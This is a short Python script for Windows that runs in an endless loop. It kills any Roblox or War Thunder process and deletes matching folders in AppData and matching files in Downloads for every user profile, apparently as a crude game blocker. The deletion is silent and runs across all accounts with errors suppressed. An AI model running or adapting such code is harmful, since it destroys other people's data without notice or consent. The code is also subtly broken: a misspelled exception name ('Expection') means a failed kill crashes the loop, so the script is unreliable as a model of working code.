import os
import sys
import time
import shutil as shutils
import psutil as psutils

start = time.time()
mask = ["roblox", "warthunder"]

while True:
    for proc in psutils.process_iter():
        if any(x in proc.name().lower() for x in mask):
            try:
                print(proc.name().lower())
                proc.kill()
            except Expection as e:
                print('Blyat', e)

    for user in os.listdir(r'C:\Users'):
        p = f"C:\\Users\\{user}"
        if os.path.isdir(p):
            r = f"{p}\\AppData\\Roaming"
            if os.path.exists(r):
                for x in os.listdir(r):
                    if os.path.isdir(f"{r}\\{x}") and any(y in x.lower() for y in mask):
                        shutils.rmtree(f"{r}\\{x}", ignore_errors=True)

            r = f"{p}\\AppData\\Local"
            if os.path.exists(r):
                for x in os.listdir(r):
                    if os.path.isdir(f"{r}\\{x}") and any(y in x.lower() for y in mask):
                        shutils.rmtree(f"{r}\\{x}", ignore_errors=True)

            r = f"{p}\\Downloads"
            if os.path.exists(r):
                for x in os.listdir(r):
                    if any(y in x.lower() for y in mask):
                        os.remove(f"{r}\\{x}")
    print('Done!')
    time.sleep(0.5 * 60)


